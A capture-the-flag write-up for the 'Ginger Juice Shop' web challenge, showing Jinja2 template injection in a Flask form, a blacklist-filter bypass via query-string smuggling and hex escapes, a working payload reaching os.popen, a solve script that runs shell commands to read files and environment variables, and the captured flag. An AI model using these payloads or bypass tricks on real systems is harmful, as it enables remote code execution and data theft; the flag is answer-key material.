---
title: "Ginger Juice Shop"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 350
flag_format: "safctf{...}"
author: "Strawhats"
---

# Ginger Juice Shop

> **Category:** WEB · **Points:** 350 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: `http://54.72.82.22:8050` (Werkzeug/3.1.9, Python 3.11.16, Flask + Jinja2)

## Recon

- `GET /` returns a single-page "CITRUS STUDIO" splash with a form:

  ```html
  <form method="POST" action="/">
    <input type="text" name="name" placeholder="Enter your name" required>
    <input type="submit" value="Submit">
  </form>
  <div class="greeting-container" id="greeting-container" style="display: none;"></div>
  ```

- No JS bundles, no `/robots.txt` / `/sitemap.xml` / `/api` — everything 404s.
  The whole attack surface is the `name` POST field, which is rendered back into
  `<h2>Hello, <NAME>! Did you find the suspects yet?</h2>`.

## Vulnerability — Jinja2 SSTI with a naive blacklist WAF

`POST name={{7*7}}` → `Hello, 49!` confirms server-side template injection.

A substring blacklist rejects any input containing these tokens
(verified by probing each token individually):

```
__   os   config   class   mro   subclasses   eval   exec
__init__   __builtins__   __globals__   __class__   __mro__
__subclasses__   __import__   system
```

Note `__` (the bare double underscore) is rejected on its own, so the usual
`{{config}}` / `{{lipsum.__globals__.os.popen(...)}}` payloads die immediately.

## Bypass

Two independent gaps defeat the filter:

1. **Only the POST body (`name`) is filtered.** Query-string parameters and
   headers are not scanned, so blacklisted substrings can be smuggled in as
   query args and referenced via `request.args`.
2. **Jinja2 honours string escapes**, so `'\x5f\x5fglobals\x5f\x5f'` yields
   `__globals__` without the literal `__` appearing in the body.

Working chain (chain A below):

```jinja
{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}
```

with query args `g=__globals__&m=os&c=<shell command>`.

Why it works:
- `lipsum` is a function defined in `jinja2/utils.py`; its `__globals__` is that
  module's globals dict, which contains `os` (verified: keys include `os`).
- `|attr(request.args.g)` == `lipsum.__globals__` (attr is a real Jinja filter;
  `getitem` is **not** — using it raises 500).
- `[...][...]` subscript then reaches `os['popen']`, `|attr('read')()` collects
  stdout.
- `popen` / `read` / `attr` / `request` / `lipsum` are all absent from the
  blacklist.

Equivalent single-shot payload using hex escapes only (no query smuggling):

```jinja
{{lipsum['\x5f\x5fglobals\x5f\x5f']['\x6fs']['popen']('id')|attr('read')()}}
```

## Exploitation

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

`find / -iname '*flag*'` → `/app/templates/flag.txt`.
`printenv` → `FLAG=safctf{42dd8c3f359acdfc9b4250f4864ffc35}`.

## Reproduce

```bash
python3 solve.py                      # defaults to the challenge URL
python3 solve.py http://host:port
```

`solve.py` proves RCE, enumerates likely flag locations, and prints the flag.

## Solve script

`web/ginger-juice-shop/solve.py`:

```python
#!/usr/bin/env python3
"""Solve Ginger Juice Shop (CITRUS STUDIO) — Jinja2 SSTI on the `name` field.

The POST body (name) is filtered by a naive substring blacklist blocking
`__`, `os`, `config`, `class`, `mro`, `subclasses`, `eval`, `exec`, ... but
query-string arguments are NOT filtered, and Jinja2 string escapes are honoured.

Chain:  lipsum|attr(request.args.g)  ->  jinja2.utils module globals
        [request.args.m]             ->  the `os` module
        .popen(cmd)                  ->  pipe
        |attr('read')()              ->  stdout

Usage: python3 solve.py [http://target:port]
"""
import re
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8050"

# Query args carry the blacklisted substrings; they bypass the body filter.
PARAMS = {
    "g": "__globals__",   # attribute of the lipsum function's module globals
    "m": "os",            # the os module inside jinja2.utils globals
}

TEMPLATE = "{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}"

CMDS = [
    "id",
    "find / -maxdepth 4 -iname '*flag*' 2>/dev/null",
    "cat /flag.txt; cat /flag; cat /app/flag.txt; cat /app/templates/flag.txt; cat /home/*/flag*",
    "ls -la / /app /home 2>/dev/null",
    "printenv",
    "cat /app/app.py 2>/dev/null | head -200",
    "cat /proc/1/cmdline | tr '\\0' ' '",
]
FLAG_RE = re.compile(r"safctf\{[0-9a-fA-F]{32}\}")


def run(cmd):
    params = dict(PARAMS, c=cmd)
    try:
        r = requests.post(TARGET + "/", data={"name": TEMPLATE}, params=params, timeout=20)
    except Exception as e:
        return f"<net error: {e}>"
    if "Invalid input" in r.text:
        return "BLOCKED"
    m = re.search(r"<h2>Hello, (.*?) Did you find", r.text, re.S)
    if m:
        return m.group(1)
    return r.text[-400:]


def main():
    print(f"[*] target {TARGET}")
    hi = run("id")
    print(f"[*] proof of RCE: {hi.strip()[:200]!r}")
    for cmd in CMDS:
        out = run(cmd)
        print(f"\n$ {cmd}\n{out[:1500]}")
        m = FLAG_RE.search(out)
        if m:
            print(f"\n[+] FLAG: {m.group(0)}")
            return m.group(0)
    print("\n[-] no flag found in the probed locations")
    return None


if __name__ == "__main__":
    sys.exit(0 if main() else 1)
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```
